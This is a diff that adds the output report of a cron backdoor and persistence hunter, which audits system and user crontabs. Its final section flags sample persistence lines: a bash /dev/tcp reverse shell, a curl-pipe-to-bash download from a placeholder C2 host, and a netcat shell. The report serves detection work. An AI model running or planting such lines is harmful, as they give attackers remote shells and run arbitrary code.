@@ -1,0 +1,57 @@
+==========================================
+   CRONJOB BACKDOOR & PERSISTENCE HUNTER  
+   Date: Mon Nov 16 14:52:59 +06 2026
+==========================================
+
+[+] 1. Auditing System Crontab (/etc/crontab):
+  -> SHELL=/bin/sh
+  -> 17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+  -> 25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+  -> 47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+  -> 52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+
+[+] 2. Scanning /etc/cron.d/ and System Cron Directories:
+  -> File: .placeholder
+  -> File: e2scrub_all
+  -> File: .placeholder
+  -> File: apport
+  -> File: apt-compat
+  -> File: dpkg
+  -> File: logrotate
+  -> File: man-db
+
+[+] 3. Checking Current User Crontab (asus):
+# Edit this file to introduce tasks to be run by cron.
+# 
+# Each task to run has to be defined through a single line
+# indicating with different fields when the task will be run
+# and what command to run for the task
+# 
+# To define the time you can provide concrete values for
+# minute (m), hour (h), day of month (dom), month (mon),
+# and day of week (dow) or use '*' in these fields (for 'any').
+# 
+# Notice that tasks will be started based on the cron's system
+# daemon's notion of time and timezones.
+# 
+# Output of the crontab jobs (including errors) is sent through
+# email to the user the crontab file belongs to (unless redirected).
+# 
+# For example, you can run a backup of all your user accounts
+# at 5 a.m every week with:
+# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
+# 
+# For more information see the manual pages of crontab(5) and cron(8)
+# 
+# m h  dom mon dow   command
+* * * * * /home/asus/firewall_audit.sh
+
+
+[+] 4. Hunting Malicious Patterns in Target Cron (reports/sample_crontab.txt):
+  [!] ALERT: Suspicious Persistence Found -> * * * * * /bin/bash -i >& /dev/tcp/192.168.1.55/4444 0>&1
+  [!] ALERT: Suspicious Persistence Found -> @reboot curl -s http://malicious-c2.example | bash
+  [!] ALERT: Suspicious Persistence Found -> 0 * * * * nc -e /bin/sh 10.0.2.15 9001
+
+==========================================
+   Cronjob Persistence Hunt Completed!    
+==========================================
